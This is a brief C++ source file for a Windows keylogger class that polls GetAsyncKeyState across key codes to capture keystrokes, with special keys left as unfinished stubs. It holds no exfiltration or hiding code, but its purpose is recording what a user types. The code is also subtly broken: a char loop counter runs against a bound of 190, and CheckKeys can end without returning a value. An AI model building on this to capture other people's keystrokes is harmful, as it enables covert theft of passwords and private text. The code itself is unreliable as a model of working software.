#include "KeyLogger.h"

using namespace std;

bool KeyIsListed(int iKey)
{
	switch (iKey)
	{
	case VK_SPACE:
		cout << " ";
		return true;
		break;
	case VK_RETURN:
		//add line to notifier

		return true;
		break;
	case VK_SHIFT:
		//do shift stuff
		return true;
		break;
	case VK_BACK:
		//remove key from chain
		return true;
		break;
	default: return false;
	}
}

char KeyLogger::CheckKeys()
{
	char key;
	for (key = 8; key <= 190; key++)
	{
		if (GetAsyncKeyState(key) == -32767)
		{
			if (KeyIsListed(key) == FALSE)
			{
				return key;
			}
		}
	}
}